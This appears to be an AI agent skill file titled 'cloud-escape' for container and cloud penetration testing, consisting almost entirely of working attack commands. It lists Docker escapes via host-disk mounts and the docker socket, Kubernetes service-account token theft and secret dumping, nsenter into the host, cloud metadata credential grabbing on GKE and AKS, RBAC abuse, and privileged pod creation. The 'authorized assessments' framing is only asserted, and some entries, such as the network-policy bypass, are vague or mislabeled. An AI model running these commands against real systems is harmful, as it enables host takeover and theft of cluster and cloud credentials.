---
name: cloud-escape
description: Container escape techniques, Kubernetes attack paths, and cloud privilege escalation for authorized assessments.
---

# Cloud Escape Skill

## Container Escape

### Docker Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep docker

# Escape via privileged mode
mkdir /tmp/host && mount /dev/sda1 /tmp/host

# Escape via docker socket
curl --unix-socket /var/run/docker.sock -s http://localhost/containers/json | jq .
docker run -v /:/host -it alpine chroot /host

# CVE-2019-5736 (runc)
# Check runc version
runc --version

# CVE-2020-15257 (containerd)
# Check for exposed socket
ls -la /run/containerd/containerd.sock
```

### Kubernetes Escape
```bash
# Check if in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Access API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# Find secrets
kubectl get secrets --all-namespaces

# Pod escape
kubectl exec -it <pod> -- /bin/bash
# In privileged pod
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# Service account abuse
kubectl auth can-i --list --as=system:serviceaccount:default:default
```

### GKE/AKS/EKS Specific
```bash
# GKE metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/hostname

# AKS managed identity
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# EKS IRSA
aws sts get-caller-identity
```

## Kubernetes Attack Paths

### RBAC Abuse
```bash
# Check cluster-admin bindings
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[] | .kind=="User" or .kind=="ServiceAccount") | select(.roleRef.name=="cluster-admin")'

# Create privileged pod
kubectl run shell --rm -i --tty --image=alpine -- sh

# Access etcd
kubectl get secrets -A -o json | jq '.items[] | select(.metadata.name | contains("etcd"))'
```

### Network Policy Bypass
```bash
# Check network policies
kubectl get networkpolicies -A

# Bypass via node port
kubectl run node-shell --rm -i --tty --image=alpine -- /bin/sh

# DNS rebinding
# Use external DNS to bypass network policies
```

## Output Format
```
[ESCAPE] Container/Kubernetes/AWS/Azure/GCP
[VULN] Escape technique
[EVIDENCE] Steps to reproduce
[IMPACT] Host access achieved
[REMEDIATION] Security configuration
```
